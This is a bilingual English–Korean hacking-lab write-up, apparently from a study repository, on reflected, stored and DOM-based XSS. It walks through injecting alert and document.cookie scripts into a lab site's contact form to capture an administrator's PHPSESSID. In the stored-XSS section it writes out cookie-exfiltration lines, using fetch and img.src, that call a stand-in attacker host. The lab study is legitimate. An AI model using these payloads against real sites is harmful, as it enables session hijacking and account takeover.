![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/1.png)<br>
This attack involves injecting malicious scripts into a website to trigger the execution of malware.<br>
웹 사이트에 악성 스크립트 삽입해 악성코드가 실행되게 하는 공격입니다.  
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
* Reflected XSS<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/2.png)<br>
<br>
This is a Reflected XSS attack technique that triggers the execution of malicious code by injecting %0D%0A (line break) characters.<br>
반사형 XSS (Reflected XSS)으로 %0D%0A (줄바꿈)등을 넣어 악성 코드가 실행되게 유도하는 방식입니다.<br>
(CVE-2023-38501)
<br>
<br>
<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/3.png)<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/4.png)<br>

<br>
<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/5.png)<br>
The malicious script will be executed by inserting (1) into the alert function, which displays a notification.<br>
알림을 나타내는 alert에 (1)을 넣어 악성 스크립트를 실행하겠습니다. 
<br>
<br>
<br>
<br>
<br>
<br>


![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/6.png)<br>
The output of 1 most intuitively indicates that the script injected by the attacker was executed.<br>
1이 나왔는데 이는, 가장 직관적으로 공격자가 주입한 스크립트가 실행됐음을 나타냅니다.
<br>
<br>
<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/7-1.png)<br>

Replacing alert(1) with alert(document.cookie) enables the extraction of cookie values from the target website.<br>
If these cookies are subsequently transmitted to an attacker-controlled server, they may be exploited for session hijacking by compromising the user’s authenticated session.<br>

alert(1)대신 alert(document.cookie)를 넣어 해당 사이트의 쿠키값을 추출할 수 있습니다.<br>
이 쿠키를 공격자의 서버로 전송하도록 코드를 짜면, 사용자의 로그인 세션을 가로채는 세션 하이재킹에 악용될 수 있습니다.

<br>
<br>
<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/7.png)<br>
There is a method of indicating a vulnerability by inserting the phrase ihackyou,<br>
or by leaving an ID or a specific identifier as proof for bug bounty or verification purposes.<br>

'ihackyou' 문구를 넣어 취약점을 알리거나 ID 또는 특정 식별값을 넣어 버그 바운티 등 인증 자료로 남기는 방법이 있습니다.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

* Stored XSS<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/9.png)<br>
<br>

Stored Cross-Site Scripting (XSS) refers to an attack where malicious scripts are persistently stored in the web server’s database and subsequently executed in users’ browsers.<br>

저장형 XSS(Stroed XSS)로 악성 스크립트가 웹 서버 데이터베이스(DB)에 영구적으로 저장되어 발생하는 공격입니다.
<br>
<br>
<br>
<br>
<br>
<br>
<br>


![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/8.png)<br>

When an IP address is entered into the address bar, the web server is accessed.<br>
IP를 주소창에 입력하면 웹 서버가 나옵니다. 
<br>
<br>
<br>
<br>
<br>
<br>
<br>


![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/.10.png)<br>
![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/11.png)<br>

By navigating to the Contact page, a message containing a malicious script, <script>alert(document.cookie)</script>, is left to extract cookie values.<br>
Contact로 이동해 <script>alert(document.cookie)</script> 쿠키값을 추출하는 악성 스크립트로 메시지를 남깁니다. 
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/12.png)<br>
Subsequently, the administrator logs in.<br>
이후 관리자가 로그인합니다.
<br>
<br>
<br>
<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/13.png)<br>
<br>
When the administrator logs in, the PHPSESSID value is exposed. This cookie value effectively serves as proof of the administrator’s authenticated session.<br>
By crafting a script that transmits this cookie to an attacker-controlled server—for example,<br>
using fetch('htttp://ww.hacker.com/steal?cookie=' + document.cookie);<br>
or img.src = 'htttp://ww.hacker.com/log.php?data=' + document.cookie);<br>
—an attacker can exploit the stolen session information to perform session hijacking and gain administrative access.<br>

관리자가 로그인 하면 PHPSESSID가 나오는데, 공격자가 요구한 쿠키값으로 관리자 로그인 증명서와 같습니다.<br>
공격자가 fetch('htttp://ww.hacker.com/steal?cookie=' + document.cookie); 또는,<br>
img.src = "htttp//ww.hacker.com/log.php?data=" + document.cookie); 처럼,<br>
공격자는 공격자의 서버로 보내는 스크립트를 구성해 관리자로 로그인하는 세션 하이재킹을 악용할 수 있습니다.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
* DOM-Based XSS<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/14.png)<br>

<br>
<br>
<br>
<br>
<br>
<br>


![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/15.png)<br>


<br>
<br>
<br>
<br>
<br>
<br>

![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/16.png)<br>


